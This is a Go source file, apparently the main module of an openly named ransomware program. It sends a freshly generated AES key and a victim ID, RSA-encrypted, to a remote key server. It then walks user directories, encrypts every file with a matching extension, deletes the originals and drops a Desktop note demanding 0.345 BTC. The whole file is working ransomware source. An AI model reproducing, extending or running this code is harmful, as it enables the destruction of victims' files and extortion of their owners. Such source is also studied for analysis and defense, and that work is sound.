package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/cmd"
	"github.com/mauri870/ransomware/rsa"
	"github.com/mauri870/ransomware/utils"
)

var (
	// RSA Public key
	// Automatically injected on autobuild with make
	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)

	// Time to keep trying persist new keys on server
	SecondsToTimeout = 5.0
)

func main() {
	// Fun ASCII
	cmd.PrintBanner()

	// Execution locked for windows
	cmd.CheckOS()

	encryptFiles()

	// Wait for enter to exit
	var s string
	fmt.Println("Press enter to quit")
	fmt.Scanf("%s", &s)
}

func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	// Loop creating new keys if server return an validation error
	for {
		// Check for timeout
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			log.Println("Timeout reached. Aborting...")
			return
		}

		// Generate the id and encryption key
		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		// Create the json payload
		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])

		// Encrypting with RSA-2048
		ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
		if err != nil {
			log.Println(err)
			continue
		}

		// Call the server to validate and store the keys
		data := url.Values{}
		data.Add("payload", hex.EncodeToString(ciphertext))
		res, err := client.CallServer("POST", "/api/keys/add", data)
		if err != nil {
			log.Println("The server refuse connection. Aborting...")
			return
		}

		// handle possible response statuses
		switch res.StatusCode {
		case 200, 204:
			// \o/
			break
		case 409:
			log.Println("Duplicated ID, trying to generate a new keypair")
			continue
		default:
			log.Printf("An error ocurred, the server respond with status %d\n"+
				" Possible bad encryption or bad json payload\n", res.StatusCode)
			continue
		}

		// Success, proceed
		break
	}

	log.Println("Walking interesting dirs and indexing files...")

	var wg sync.WaitGroup

	wg.Add(1)
	// Loop over the interesting directories
	go func() {
		defer wg.Done()
		for _, f := range cmd.InterestingDirs {
			folder := cmd.BaseDir + f
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				ext := filepath.Ext(path)
				if ext != "" {
					// Matching extensions
					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
						wg.Add(1)
						cmd.MatchedFiles <- file
						log.Println("Matched:", path)
					}
				}
				return nil
			})
		}
		close(cmd.MatchedFiles)
	}()

	// Process file that are sended to channel
	// Launch NumWorker for handle files
	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.MatchedFiles:
					if !ok {
						return
					}
					defer wg.Done()

					log.Printf("Encrypting %s...\n", file.Path)

					// Read the file content
					text, err := ioutil.ReadFile(file.Path)
					if err != nil {
						log.Println(err)
						return
					}

					// Encrypting using AES-256-CFB
					ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
					if err != nil {
						log.Println(err)
						return
					}

					newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
					err = ioutil.WriteFile(newpath+cmd.EncryptionExtension, ciphertext, 0600)
					if err != nil {
						log.Println(err)
						return
					}

					// Remove the original file
					err = os.Remove(file.Path)
					if err != nil {
						log.Println("Cannot delete original file, skipping...")
					}
				}
			}
		}()
	}

	wg.Wait()

	message := `
	<pre>
	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
	AES-256 ALGORITHM.

	YOUR IDENTIFICATION IS %s

	PLEASE SEND %s TO THE FOLLOWING WALLET

		    %s

	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
	FILES
	</pre>
	`
	content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))

	// Write the READ_TO_DECRYPT on Desktop
	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)

	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
}
